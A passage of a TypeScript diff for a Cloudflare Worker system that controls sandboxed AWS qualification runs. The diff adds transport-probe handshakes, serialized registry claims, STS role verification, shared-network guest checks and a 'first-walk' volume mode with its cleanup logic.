+ export default AWSQualificationTransport;
+@@ -223,6 +284,34 @@ export class AWSQualificationController extends WorkerEntrypoint<
+   AWSQualificationAuthorityEnv,
+   AWSQualificationControllerProps
+ > {
++  // Intentionally independent of registry, run, signer and logical expiry. The
++  // reply describes this invocation's bound props; it grants no operation.
++  async bindingIdentity(challenge: string): Promise<AWSQualificationBindingIdentity> {
++    const props = this.ctx.props;
++    const authorityVersion = this.env.CF_VERSION_METADATA?.id;
++    if (
++      arguments.length !== 1 ||
++      typeof challenge !== "string" ||
++      !/^[0-9a-f]{64}$/.test(challenge) ||
++      !props ||
++      Object.keys(props).length !== 1 ||
++      !Object.hasOwn(props, "deploymentHash") ||
++      typeof props.deploymentHash !== "string" ||
++      !/^[0-9a-f]{64}$/.test(props.deploymentHash) ||
++      typeof authorityVersion !== "string" ||
++      !/^[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}$/.test(authorityVersion)
++    ) {
++      throw new Error("AWS qualification binding identity is invalid");
++    }
++    return {
++      protocol: 1,
++      role: "controller",
++      challenge,
++      props: structuredClone(props),
++      authorityVersion,
++    };
++  }
++
+   async enroll(identity: AWSQualificationRunIdentity): Promise<void> {
+     await this.claim(identity);
+   }
+@@ -246,16 +335,36 @@ export class AWSQualificationController extends WorkerEntrypoint<
+   }
+ 
+   async claim(identity: AWSQualificationRunIdentity): Promise<AWSQualificationRegistryRecord> {
+-    // Persist the per-run cleanup owner before making this run globally active. Candidate
+-    // dispatch also checks the registry, so a losing concurrent claim cannot use its run state.
+-    await qualificationRun(this.env, identity.runId).enroll(this.ctx.props, identity);
+-    return await qualificationRegistry(this.env).claim(this.ctx.props, identity);
++    // The registry serializes probe admission against the entire enrollment hop,
++    // including AWS verification. Checking only after enrollment is too late.
++    return await qualificationRegistry(this.env).enrollAndClaim(this.ctx.props, identity);
+   }
+ 
+   async discover(): Promise<AWSQualificationRegistryRecord | undefined> {
+     return await qualificationRegistry(this.env).discover(this.ctx.props);
+   }
+ 
++  async openTransportProbe(
++    request: AWSQualificationTransportProbeRequest,
++  ): Promise<AWSQualificationTransportProbe> {
++    return await qualificationRegistry(this.env).openTransportProbe(this.ctx.props, request);
++  }
++
++  async discoverTransportProbe(): Promise<AWSQualificationTransportProbe | undefined> {
++    return await qualificationRegistry(this.env).discoverTransportProbe(this.ctx.props);
++  }
++
++  async settleTransportProbe(
++    challenge: string,
++    verified: boolean,
++  ): Promise<AWSQualificationTransportProbe> {
++    return await qualificationRegistry(this.env).settleTransportProbe(
++      this.ctx.props,
++      challenge,
++      verified,
++    );
++  }
++
+   async retire(runId: string): Promise<void> {
+     const attestation = await qualificationRun(this.env, runId).attest(this.ctx.props);
+     if (!attestation.finalized) throw new Error("AWS qualification run is not finalized");
+@@ -264,6 +373,157 @@ export class AWSQualificationController extends WorkerEntrypoint<
+ }
+ 
+ export class AWSQualificationRegistry extends DurableObject<AWSQualificationAuthorityEnv> {
++  private serial = Promise.resolve();
++  private pending = 0;
++
++  private async serialized<T>(operation: () => Promise<T>): Promise<T> {
++    if (this.pending >= maxPendingIntents) throw new Error("qualification registry queue is full");
++    this.pending++;
++    const result = this.serial.then(operation);
++    this.serial = result.then(
++      () => undefined,
++      () => undefined,
++    );
++    try {
++      return await result;
++    } finally {
++      this.pending--;
++    }
++  }
++
++  private async noTransportProbe(identity?: AWSQualificationRunIdentity): Promise<void> {
++    const probe = await this.ctx.storage.get<AWSQualificationTransportProbe>("transport-probe");
++    if (
++      probe?.state === "cancelled" &&
++      identity &&
++      canonicalJSON(probe.identity) === canonicalJSON(identity)
++    )
++      throw new Error("AWS qualification transport probe was cancelled");
++    if (probe && !["verified", "cancelled"].includes(probe.state)) {
++      // Expiry denies work; it is deliberately not cleanup or permission to claim.
++      throw new Error("AWS qualification transport probe is unsettled");
++    }
++  }
++
++  async openTransportProbe(
++    controller: AWSQualificationControllerProps,
++    request: AWSQualificationTransportProbeRequest,
++  ): Promise<AWSQualificationTransportProbe> {
++    return await this.serialized(async () => {
++      validateTransportProbe(request);
++      validateController(controller, request.identity.deploymentHash);
++      if (request.authorityVersion !== this.env.CF_VERSION_METADATA?.id)
++        throw new Error("transport probe authority version differs");
++      if (await this.ctx.storage.get(registryStateKey))
++        throw new Error("qualification run is active");
++      const current = await this.ctx.storage.get<AWSQualificationTransportProbe>("transport-probe");
++      if (current) {
++        const { protocol: _protocol, state: _state, observedAt: _at, ...original } = current;
++        if (canonicalJSON(original) === canonicalJSON(request)) {
++          if (["verified", "cancelled"].includes(current.state))
++            throw new Error("transport probe is settled");
++          return current; // reconcile an uncertain open; never reset an observation
++        }
++        if (
++          !["verified", "cancelled"].includes(current.state) ||
++          Date.now() < Date.parse(current.expiresAt)
++        )
++          throw new Error("transport probe slot or replay tombstone is occupied");
++      }
++      const probe: AWSQualificationTransportProbe = {
++        protocol: 1,
++        ...structuredClone(request),
++        state: "pending",
++      };
++      await this.ctx.storage.put("transport-probe", probe);
++      return probe;
++    });
++  }
++
++  async observeTransport(
++    identity: AWSQualificationRunIdentity,
++    challenge: string,
++    authorityVersion: string | undefined,
++  ): Promise<void> {
++    return await this.serialized(async () => {
++      validateExactTransportIdentity(identity);
++      if (typeof challenge !== "string" || !/^[0-9a-f]{64}$/.test(challenge))
++        throw new Error("invalid transport challenge");
++      const probe = await this.ctx.storage.get<AWSQualificationTransportProbe>("transport-probe");
++      if (
++        !probe ||
++        probe.state !== "pending" ||
++        probe.challenge !== challenge ||
++        Date.now() >= Date.parse(probe.expiresAt) ||
++        probe.authorityVersion !== authorityVersion ||
++        authorityVersion !== this.env.CF_VERSION_METADATA?.id ||
++        canonicalJSON(probe.identity) !== canonicalJSON(identity)
++      )
++        throw new Error("transport probe observation does not match");
++      await this.ctx.storage.put("transport-probe", {
++        ...probe,
++        state: "observed",
++        observedAt: new Date().toISOString(),
++      });
++    });
++  }
++
++  async discoverTransportProbe(
++    controller: AWSQualificationControllerProps,
++  ): Promise<AWSQualificationTransportProbe | undefined> {
++    validateControllerShape(controller);
++    // Trusted discovery reveals custody, but a mismatched controller cannot mutate it.
++    return await this.ctx.storage.get<AWSQualificationTransportProbe>("transport-probe");
++  }
++
++  async settleTransportProbe(
++    controller: AWSQualificationControllerProps,
++    challenge: string,
++    verified: boolean,
++  ): Promise<AWSQualificationTransportProbe> {
++    return await this.serialized(async () => {
++      const probe = await this.ctx.storage.get<AWSQualificationTransportProbe>("transport-probe");
++      if (!probe || probe.challenge !== challenge || typeof verified !== "boolean")
++        throw new Error("transport probe settlement mismatch");
++      validateController(controller, probe.identity.deploymentHash);
++      const state = verified ? "verified" : "cancelled";
++      if (["verified", "cancelled"].includes(probe.state)) {
++        if (probe.state !== state) throw new Error("transport probe settlement changed");
++        return probe;
++      }
++      if (
++        verified &&
++        (probe.state !== "observed" ||
++          Date.now() >= Date.parse(probe.expiresAt) ||
++          probe.authorityVersion !== this.env.CF_VERSION_METADATA?.id)
++      )
++        throw new Error("transport probe was not observed live");
++      const settled = { ...probe, state } as AWSQualificationTransportProbe;
++      await this.ctx.storage.put("transport-probe", settled);
++      return settled;
++    });
++  }
++
++  async enrollAndClaim(
++    controller: AWSQualificationControllerProps,
++    identity: AWSQualificationRunIdentity,
++  ): Promise<AWSQualificationRegistryRecord> {
++    return await this.serialized(async () => {
++      await this.noTransportProbe(identity);
++      validateController(controller, identity.deploymentHash);
++      validateRunIdentity(identity);
++      validateRunWindow(identity);
++      const active = await this.ctx.storage.get<AWSQualificationRegistryRecord>(registryStateKey);
++      if (
++        active &&
++        canonicalJSON(registryIdentity(active)) !== canonicalJSON(registryIdentity(identity))
++      )
++        throw new Error("AWS qualification registry already has an active run");
++      await qualificationRun(this.env, identity.runId).enroll(controller, identity);
++      return await this.claimSerialized(controller, identity);
++    });
++  }
++
+   async assertActive(identity: AWSQualificationRunIdentity): Promise<void> {
+     validateRunIdentity(identity);
+     const active = await this.ctx.storage.get<AWSQualificationRegistryRecord>(registryStateKey);
+@@ -279,6 +539,7 @@ export class AWSQualificationRegistry extends DurableObject<AWSQualificationAuth
+   async discover(
+     controller: AWSQualificationControllerProps,
+   ): Promise<AWSQualificationRegistryRecord | undefined> {
++    await this.noTransportProbe();
+     const active = await this.ctx.storage.get<AWSQualificationRegistryRecord>(registryStateKey);
+     if (active) validateController(controller, active.deploymentHash);
+     else validateControllerShape(controller);
+@@ -289,6 +550,14 @@ export class AWSQualificationRegistry extends DurableObject<AWSQualificationAuth
+     controller: AWSQualificationControllerProps,
+     identity: AWSQualificationRunIdentity,
+   ): Promise<AWSQualificationRegistryRecord> {
++    return await this.serialized(() => this.claimSerialized(controller, identity));
++  }
++
++  private async claimSerialized(
++    controller: AWSQualificationControllerProps,
++    identity: AWSQualificationRunIdentity,
++  ): Promise<AWSQualificationRegistryRecord> {
++    await this.noTransportProbe(identity);
+     validateController(controller, identity.deploymentHash);
+     validateRunIdentity(identity);
+     validateRunWindow(identity);
+@@ -446,6 +715,7 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+         return;
+       }
+       const policyHash = await qualificationPolicyHash(policy);
++      await this.verifySharedNetwork(policy);
+       const retainedRootDeviceName = await this.verifyRetainedImage(identity, policy);
+       validateRunWindow(identity);
+       await this.ctx.storage.put({
+@@ -463,7 +733,12 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+         [ledgerKey]: emptyLedger(),
+       });
+       await this.ctx.storage.setAlarm(
+-        expiresAt - (identity.retainedImage ? awsQualificationCleanupReserveMs : 0),
++        expiresAt -
++          (identity.firstWalk
++            ? 20 * 60_000
++            : identity.retainedImage
++              ? awsQualificationCleanupReserveMs
++              : 0),
+       );
+       // Keep persisted ownership and its alarm if storage crossed the cutoff.
+       // A refused registry claim must not orphan a run that already owns cleanup.
+@@ -475,7 +750,159 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+     identity: AWSQualificationRunIdentity,
+     request: AWSQualificationRequest,
+   ): Promise<AWSQualificationResponse> {
+-    return await this.serialized(() => this.executeSerialized(identity, request));
++    return await this.serialized(async () => {
++      const result = await this.executeSerialized(identity, request);
++      // Apply this to replays and reconciled launches as well. The ledger and
++      // receipt already own any effect before a failed guest check can throw.
++      if (
++        result.status >= 200 &&
++        result.status < 300 &&
++        ["RunInstances", "DescribeInstances"].includes(request.action)
++      ) {
++        const run = await this.ctx.storage.get<AWSQualificationRunState>(stateKey);
++        if (run && !run.finalizingAt && !run.finalizedAt) {
++          const ledger = await this.ledger();
++          await this.verifySharedNetwork(
++            run.policy,
++            ledger.instanceIds.filter((id) => !ledger.terminatingInstanceIds.includes(id)),
++          );
++        }
++      }
++      return result;
++    });
++  }
++
++  async firstWalkStatus(
++    identity: AWSQualificationRunIdentity,
++  ): Promise<AWSQualificationFirstWalkStatus> {
++    return await this.serialized(async () => {
++      const run = await this.ctx.storage.get<AWSQualificationRunState>(stateKey);
++      if (
++        !run ||
++        !run.identity.firstWalk ||
++        canonicalJSON(identity) !== canonicalJSON(run.identity)
++      )
++        throw new Error("first-walk binding is not enrolled");
++      return firstWalkStatus(
++        identity,
++        await this.ctx.storage.get<FirstWalkState>(firstWalkKey),
++        Boolean(run.finalizedAt),
++      );
++    });
++  }
++
++  async prepareFirstWalk(
++    identity: AWSQualificationRunIdentity,
++    input: AWSQualificationFirstWalkRequest,
++  ): Promise<AWSQualificationFirstWalkStatus> {
++    return await this.serialized(async () => {
++      const run = await this.requireActiveRun(identity, "FirstWalk");
++      if (!identity.firstWalk) throw new Error("first-walk is not enabled");
++      if (
++        !isPlainRecord(input) ||
++        Object.keys(input).toSorted().join(",") !==
++          "checkpointID,claimHash,instanceID,readinessReceiptSha256,snapshotID" ||
++        !/^chk_[A-Za-z0-9_-]{1,128}$/.test(input.checkpointID) ||
++        !/^[a-f0-9]{64}$/.test(input.claimHash) ||
++        !/^[a-f0-9]{64}$/.test(input.readinessReceiptSha256) ||
++        !/^i-[a-f0-9]+$/.test(input.instanceID) ||
++        !/^snap-[a-f0-9]+$/.test(input.snapshotID)
++      )
++        throw new Error("first-walk request is malformed");
++      const ledger = await this.ledger();
++      if (
++        !ledger.instanceIds.includes(input.instanceID) ||
++        !(
++          ledger.snapshotIds.includes(input.snapshotID) ||
++          identity.retainedImage?.snapshotId === input.snapshotID
++        )
++      )
++        throw new Error("first-walk source or instance is outside the run ledger");
++      await this.verifySharedNetwork(run.policy, [input.instanceID]);
++      const pinned = await this.ctx.storage.get<FirstWalkState>(firstWalkKey);
++      // Canonicalize the request before persistence and immutable retry comparison.
++      const request = {
++        checkpointID: input.checkpointID,
++        claimHash: input.claimHash,
++        instanceID: input.instanceID,
++        snapshotID: input.snapshotID,
++        readinessReceiptSha256: input.readinessReceiptSha256,
++      };
++      if (pinned && canonicalJSON(pinned.request) !== canonicalJSON(request))
++        throw new Error("first-walk request is immutable");
++      const state = await prepareFirstWalk(this.firstWalkOwner(run, false), request);
++      if (state.volumeID) {
++        ledger.volumeIds = [...new Set([...ledger.volumeIds, state.volumeID])];
++        await this.ctx.storage.put(ledgerKey, ledger);
++      }
++      return firstWalkStatus(identity, state, false);
++    });
++  }
++
++  private firstWalkOwner(run: AWSQualificationRunState, cleanup: boolean): FirstWalkOwner {
++    return {
++      identity: run.identity,
++      accountID: run.policy.accountId,
++      read: () => this.ctx.storage.get<FirstWalkState>(firstWalkKey),
++      write: (state) => this.ctx.storage.put(firstWalkKey, state),
++      query: async (action, parameters, mutating = false) => {
++        // One existing signer/cleanup owner. No URL, credentials or raw volume API
++        // is exposed to the candidate. Check live account on every dispatch.
++        await this.ensureAccount(run.policy);
++        if (!cleanup) await this.requireActiveRun(run.identity, "FirstWalk");
++        else if (mutating && action !== "DeleteVolume")
++          throw new Error("first-walk cleanup action denied");
++        if (!cleanup && mutating) {
++          const ledger = await this.ledger();
++          await this.verifySharedNetwork(
++            run.policy,
++            ledger.instanceIds.filter((id) => !ledger.terminatingInstanceIds.includes(id)),
++          );
++        }
++        let cleanupSequence: number | undefined;
++        let evidence: AWSQualificationOperationEvidence | undefined;
++        const key = `${evidencePrefix}${await sha256Hex(`first-walk:${action}:${canonicalJSON(parameters)}`)}`;
++        if (cleanup && mutating)
++          cleanupSequence = await this.beginCleanupEvidence(action, parameters);
++        if (!cleanup && mutating) {
++          const current = await this.ctx.storage.get<AWSQualificationRunState>(stateKey);
++          if (!current || current.operationCount >= maxCandidateOperations)
++            throw new Error("first-walk operation limit reached");
++          Object.assign(run, current);
++          run.operationCount += 1;
++          evidence = (await this.ctx.storage.get<AWSQualificationOperationEvidence>(key)) ?? {
++            version: awsQualificationAttestationVersion,
++            opDigest: key.slice(evidencePrefix.length),
++            requestDigest: await sha256Hex(canonicalJSON(parameters)),
++            action,
++            requestedAt: new Date().toISOString(),
++            signerDispatches: [],
++          };
++          evidence = await this.beginSignerDispatch(run, key, evidence);
++          this.assertCandidateDispatchWindow(run, "FirstWalk");
++        }
++        let response: AWSQualificationResponse;
++        try {
++          response = await boundedResponse(
++            await this.signer.execute("ec2", action, run.policy.region, parameters),
++          );
++          if (evidence) await this.finishSignerDispatch(run, key, evidence, response);
++          if (cleanupSequence !== undefined)
++            await this.finishCleanupEvidence(
++              cleanupSequence,
++              response.status < 300 ? "accepted" : "rejected",
++              response.status,
++            );
++        } catch (error) {
++          if (cleanupSequence !== undefined)
++            await this.finishCleanupEvidence(cleanupSequence, "error");
++          throw error;
++        }
++        if (response.status < 200 || response.status >= 300)
++          throw new Error(`first-walk ${action} http ${response.status}: ${response.body}`);
++        return response.body;
++      },
++    };
+   }
+ 
+   async finalize(controller?: AWSQualificationControllerProps): Promise<AWSQualificationLedger> {
+@@ -505,6 +932,15 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+         await this.ctx.storage.get<AWSQualificationFinalReceipt>(finalReceiptKey);
+       return {
+         version: awsQualificationAttestationVersion,
++        ...(run.identity.firstWalk
++          ? {
++              firstWalk: firstWalkStatus(
++                run.identity,
++                await this.ctx.storage.get<FirstWalkState>(firstWalkKey),
++                Boolean(run.finalizedAt),
++              ),
++            }
++          : {}),
+         runId: run.identity.runId,
+         candidateSha: run.identity.candidateSha,
+         candidateWorker: run.identity.candidateWorker,
+@@ -606,6 +1042,13 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+     }
+ 
+     const ledger = await this.ledger();
++    const firstWalk = await this.ctx.storage.get<FirstWalkState>(firstWalkKey);
++    if (
++      firstWalk &&
++      (normalizedRequest.action === "DeleteSnapshot" ||
++        normalizedRequest.action === "DeregisterImage")
++    )
++      throw new Error("first-walk source remains pinned until run finalization");
+     const pending = await this.ctx.storage.list<AWSQualificationIntent>({ prefix: intentPrefix });
+     try {
+       if (!priorIntent) {
+@@ -646,6 +1089,17 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+       if (normalizedRequest.service !== "sts") {
+         await this.ensureAccount(policy);
+       }
++      if (
++        authorized.mutating &&
++        !["TerminateInstances", "DeleteKeyPair", "DeregisterImage", "DeleteSnapshot"].includes(
++          normalizedRequest.action,
++        )
++      ) {
++        await this.verifySharedNetwork(
++          policy,
++          ledger.instanceIds.filter((id) => !ledger.terminatingInstanceIds.includes(id)),
++        );
++      }
+     } catch (error) {
+       await this.ctx.storage.put(evidenceKey, {
+         ...evidence,
+@@ -911,6 +1365,57 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+   }
+ 
+   private async ensureAccount(policy: AWSQualificationPolicy): Promise<void> {
++    const roleArn =
++      policy.roleArn === undefined
++        ? (await this.requireLegacyCleanupRun(policy)).legacyCleanupRoleArn
++        : policy.roleArn;
++    await this.verifyAccountRole(policy, roleArn);
++  }
++
++  private async requireLegacyCleanupRun(
++    policy: AWSQualificationPolicy,
++  ): Promise<AWSQualificationRunState> {
++    const run = await this.ctx.storage.get<AWSQualificationRunState>(stateKey);
++    if (
++      !run?.finalizingAt ||
++      run.finalizedAt ||
++      Object.keys(policy).toSorted().join(",") !==
++        "accountId,baseAmiId,region,rootGB,securityGroupId,subnetId" ||
++      canonicalJSON(run.policy) !== canonicalJSON(policy) ||
++      run.policyHash !== (await qualificationPolicyHash(policy))
++    ) {
++      throw new Error("AWS qualification legacy policy requires verified cleanup transition");
++    }
++    return run;
++  }
++
++  private async bindLegacyCleanupRole(run: AWSQualificationRunState): Promise<void> {
++    if (run.policy.roleArn !== undefined) return;
++    await this.requireLegacyCleanupRun(run.policy);
++    if (run.legacyCleanupRoleArn !== undefined) return;
++    const { roleArn, network: _network, ...legacyPolicy } = authorityPolicy(this.env);
++    if (canonicalJSON(legacyPolicy) !== canonicalJSON(run.policy)) {
++      throw new Error("AWS qualification legacy cleanup policy does not match configuration");
++    }
++    // The old schema had no role binding. Accept an operator-configured role only
++    // after verifying the unchanged resource policy and its live STS principal.
++    // Persist it on this same owner before cleanup; retries may not select another.
++    await this.verifyAccountRole(run.policy, roleArn);
++    run.legacyCleanupRoleArn = roleArn;
++    await this.ctx.storage.put(stateKey, run);
++  }
++
++  private async verifyAccountRole(
++    policy: AWSQualificationPolicy,
++    roleArn: string | undefined,
++  ): Promise<void> {
++    if (
++      !roleArn ||
++      !new RegExp(`^arn:aws:iam::${policy.accountId}:role/[A-Za-z0-9+=,.@_/-]+$`).test(roleArn) ||
++      roleArn.endsWith("/")
++    ) {
++      throw new Error("AWS qualification role ARN is malformed");
++    }
+     const response = await this.signer.execute("sts", "GetCallerIdentity", policy.region, {});
+     const result = await boundedResponse(response);
+     if (result.status < 200 || result.status >= 300) {
+@@ -922,6 +1427,16 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+     if (asString(identity["Account"]) !== policy.accountId) {
+       throw new Error("AWS qualification authority is authenticated to the wrong account");
+     }
++    // IAM role names are unique within an account, including across IAM paths.
++    // STS assumed-role ARNs contain that name, without the IAM path.
++    const expectedPrefix = `arn:aws:sts::${policy.accountId}:assumed-role/${roleArn.split("/").at(-1)}/`;
++    const principal = asString(identity["Arn"]);
++    if (
++      !principal.startsWith(expectedPrefix) ||
++      !/^[A-Za-z0-9+=,.@_-]{2,64}$/.test(principal.slice(expectedPrefix.length))
++    ) {
++      throw new Error("AWS qualification authority is authenticated to the wrong role");
++    }
+   }
+ 
+   private async verifyRetainedImage(
+@@ -1084,7 +1599,7 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+     run: AWSQualificationRunState,
+     intentKey: string,
+   ): Promise<void> {
+-    if (run.identity.retainedImage) {
++    if (run.identity.retainedImage || run.identity.firstWalk) {
+       const intent = await this.ctx.storage.get<AWSQualificationIntent>(intentKey);
+       this.assertCandidateDispatchWindow(run, intent?.request.action ?? "");
+     }
+@@ -1099,8 +1614,9 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+     const expiresAt = Date.parse(run.identity.expiresAt);
+     if (now >= expiresAt) throw new Error("AWS qualification run expired before signer dispatch");
+     if (
+-      run.identity.retainedImage &&
+-      now >= expiresAt - awsQualificationCleanupReserveMs &&
++      (run.identity.retainedImage || run.identity.firstWalk) &&
++      now >=
++        expiresAt - (run.identity.firstWalk ? 20 * 60_000 : awsQualificationCleanupReserveMs) &&
+       !retainedCleanupReads.has(action) &&
+       !["TerminateInstances", "DeleteKeyPair"].includes(action)
+     ) {
+@@ -1150,6 +1666,7 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+     const failures: string[] = [];
+     await this.beginFinalReceipt(ledger);
+     try {
++      await this.bindLegacyCleanupRole(run);
+       await this.ensureAccount(policy);
+       await this.recordVerificationEvidence("GetCallerIdentity", "accepted");
+     } catch (error) {
+@@ -1168,6 +1685,38 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+       "pre-cleanup",
+     );
+     await this.ctx.storage.put(ledgerKey, recoveredLedger);
++    if (run.identity.firstWalk) {
++      const firstWalk = await this.ctx.storage.get<FirstWalkState>(firstWalkKey);
++      if (firstWalk?.volumeID)
++        recoveredLedger.volumeIds = [
++          ...new Set([...recoveredLedger.volumeIds, firstWalk.volumeID]),
++        ];
++      for (const instanceId of ownedWithRetired(
++        recoveredLedger.instanceIds,
++        recoveredLedger.retiredInstanceIds,
++      )) {
++        // oxlint-disable-next-line eslint/no-await-in-loop -- stop all guest writers before data-volume deletion.
++        await this.cleanup(
++          run,
++          policy,
++          "TerminateInstances",
++          { "InstanceId.1": instanceId },
++          failures,
++        );
++      }
++      try {
++        const ids = await cleanupFirstWalk(this.firstWalkOwner(run, true));
++        recoveredLedger.volumeIds = [...new Set([...recoveredLedger.volumeIds, ...ids])];
++        await this.ctx.storage.put(ledgerKey, recoveredLedger);
++      } catch {
++        failures.push("first-walk volume cleanup pending");
++      }
++      if (failures.length) {
++        await this.completeFinalReceipt(recoveredLedger, failures);
++        await this.ctx.storage.setAlarm(Date.now() + cleanupRetryMs);
++        throw new Error("first-walk cleanup incomplete; source pin retained");
++      }
++    }
+     for (const imageId of ownedWithRetired(
+       recoveredLedger.imageIds,
+       recoveredLedger.retiredImageIds,
+@@ -1547,6 +2096,18 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+       for (const result of [instances, images, snapshots, volumes, keys]) {
+         if (result.status >= 300) throw new Error(`inventory http ${result.status}`);
+       }
++      if (run.identity.firstWalk) {
++        for (const [result, action] of [
++          [instances, "DescribeInstances"],
++          [images, "DescribeImages"],
++          [snapshots, "DescribeSnapshots"],
++          [volumes, "DescribeVolumes"],
++          [keys, "DescribeKeyPairs"],
++        ] as const) {
++          if (awsXMLRoot(result.body, action)["nextToken"])
++            throw new Error("first-walk inventory is paginated");
++        }
++      }
+       ledger.instanceIds = reservationsFromXML(instances.body, run.policy.accountId)
+         .flatMap((reservation) => items(record(reservation["instancesSet"])["item"]).map(record))
+         .filter((instance) => asString(record(instance["instanceState"])["name"]) !== "terminated")
+@@ -1581,6 +2142,7 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+         ledger.instanceIds.length > maxActiveInstances ||
+         ledger.imageIds.length > maxActiveImages ||
+         ledger.snapshotIds.length > maxActiveSnapshots ||
++        (run.identity.firstWalk && ledger.volumeIds.length > 2) ||
+         ledger.keyPairIds.length > 1
+       ) {
+         failures.push("run-tag inventory exceeds qualification resource bounds");
+@@ -1662,7 +2224,7 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+       ledger.retiredInstanceIds = ledger.retiredInstanceIds.filter((id) => id !== instanceId);
+       for (const mapping of items(record(instance["blockDeviceMapping"])["item"]).map(record)) {
+         const volumeId = asString(record(mapping["ebs"])["volumeId"]);
+-        if (volumeId) ledger.volumeIds = [volumeId];
++        if (volumeId) ledger.volumeIds = [...new Set([...ledger.volumeIds, volumeId])];
+       }
+     }
+     await this.ctx.storage.put(ledgerKey, ledger);
+@@ -1780,6 +2342,42 @@ export class AWSQualificationRun extends DurableObject<AWSQualificationAuthority
+     );
+   }
+ 
++  private async verifySharedNetwork(
++    policy: AWSQualificationPolicy,
++    instanceIds: string[] = [],
++  ): Promise<void> {
++    if (policy.network?.mode !== "shared-subnet") return;
++    await this.ensureAccount(policy);
++    const query = async (action: string, parameters: Record<string, string>) => {
++      const result = await boundedResponse(
++        await this.signer.execute("ec2", action, policy.region, parameters),
++      );
++      if (result.status < 200 || result.status >= 300)
++        throw new Error(`AWS qualification network ${action} http ${result.status}`);
++      return awsXMLRoot(result.body, action);
++    };
++    await verifyQualificationNetwork(policy.network, policy, query);
++    if (instanceIds.length > maxActiveInstances)
++      throw new Error("AWS qualification guest inventory exceeds policy");
++    const instanceId = instanceIds[0];
++    if (instanceId) {
++      const root = await query("DescribeInstances", { "InstanceId.1": instanceId });
++      const reservations = items(record(root["reservationSet"])["item"]).map(record);
++      const instances = reservations.flatMap((r) =>
++        items(record(r["instancesSet"])["item"]).map(record),
++      );
++      if (
++        asString(root["nextToken"]) ||
++        reservations.length !== 1 ||
++        asString(reservations[0]!["ownerId"]) !== policy.accountId ||
++        instances.length !== 1 ||
++        asString(instances[0]!["instanceId"]) !== instanceId
++      )
++        throw new Error("AWS qualification guest identity differs from admission");
++      verifyQualificationGuest(policy.network, policy, instances[0]!);
++    }
++  }
++
+   private async retireUnresolvedIntents(): Promise<void> {
+     const pending = await this.ctx.storage.list<AWSQualificationIntent>({ prefix: intentPrefix });
+     await Promise.all([...pending].map(([key]) => this.ctx.storage.delete(key)));
+@@ -2236,9 +2834,11 @@ function authorizedRunInstances(
+   }
+   const imageId = input["ImageId"] ?? "";
+   if (
+-    identity.retainedImage
+-      ? imageId !== identity.retainedImage.imageId
+-      : imageId !== policy.baseAmiId && !ledger.imageIds.includes(imageId)
++    identity.firstWalk
++      ? imageId !== policy.baseAmiId
++      : identity.retainedImage
++        ? imageId !== identity.retainedImage.imageId
++        : imageId !== policy.baseAmiId && !ledger.imageIds.includes(imageId)
+   ) {
+     throw new Error("AWS qualification image is outside the run ledger");
+   }
+@@ -2262,7 +2862,7 @@ function authorizedRunInstances(
+   );
+   const rootGB = Number(input["BlockDeviceMapping.1.Ebs.VolumeSize"]);
+   if (
+-    identity.retainedImage
++    identity.retainedImage && !identity.firstWalk
+       ? rootGB !== awsQualificationRetainedRootGB
+       : !Number.isInteger(rootGB) || rootGB < 8 || rootGB > policy.rootGB
+   ) {
+@@ -2283,11 +2883,14 @@ function authorizedRunInstances(
+     MaxCount: "1",
+     MinCount: "1",
+     UserData: userData,
+-    "BlockDeviceMapping.1.DeviceName": retainedRootDeviceName ?? "/dev/sda1",
++    "BlockDeviceMapping.1.DeviceName": identity.firstWalk
++      ? "/dev/sda1"
++      : (retainedRootDeviceName ?? "/dev/sda1"),
+     "BlockDeviceMapping.1.Ebs.DeleteOnTermination": "true",
+     "BlockDeviceMapping.1.Ebs.Encrypted": "true",
+     "BlockDeviceMapping.1.Ebs.VolumeSize": String(rootGB),
+     "BlockDeviceMapping.1.Ebs.VolumeType": "gp3",
++    ...(identity.firstWalk ? { "CreditSpecification.CpuCredits": "standard" } : {}),
+     "MetadataOptions.HttpEndpoint": "enabled",
+     "MetadataOptions.HttpPutResponseHopLimit": "1",
+     "MetadataOptions.HttpTokens": "required",
+@@ -2445,7 +3048,7 @@ function updateLedgerFromResponse(
+         }
+         for (const mapping of items(record(instance["blockDeviceMapping"])["item"]).map(record)) {
+           const volumeId = asString(record(mapping["ebs"])["volumeId"]);
+-          if (volumeId) ledger.volumeIds = [volumeId];
++          if (volumeId) ledger.volumeIds = [...new Set([...ledger.volumeIds, volumeId])];
+         }
+       }
+     }
+@@ -2526,6 +3129,59 @@ function updateLedgerFromResponse(
+   }
+ }
+ 
++function validateExactTransportIdentity(identity: AWSQualificationRunIdentity): void {
++  if (
++    !isPlainRecord(identity) ||
++    !["runId", "owner", "candidateSha", "candidateWorker", "deploymentHash", "expiresAt"].every(
++      (key) => typeof identity[key] === "string",
++    ) ||
++    Object.keys(identity).some(
++      (key) =>
++        ![
++          "runId",
++          "owner",
++          "candidateSha",
++          "candidateWorker",
++          "deploymentHash",
++          "expiresAt",
++          "firstWalk",
++          "retainedImage",
++        ].includes(key),
++    )
++  )
++    throw new Error("transport identity contains unknown fields");
++  validateRunIdentity(identity);
++  if (JSON.stringify(identity).length > 2048) throw new Error("transport identity exceeds bound");
++}
++
++function validateTransportProbe(request: AWSQualificationTransportProbeRequest): void {
++  if (
++    !isPlainRecord(request) ||
++    Object.keys(request).toSorted().join(",") !==
++      "authorityVersion,candidateVersion,challenge,expiresAt,identity" ||
++    typeof request.challenge !== "string" ||
++    !/^[0-9a-f]{64}$/.test(request.challenge) ||
++    ![request.authorityVersion, request.candidateVersion].every(
++      (version) =>
++        typeof version === "string" &&
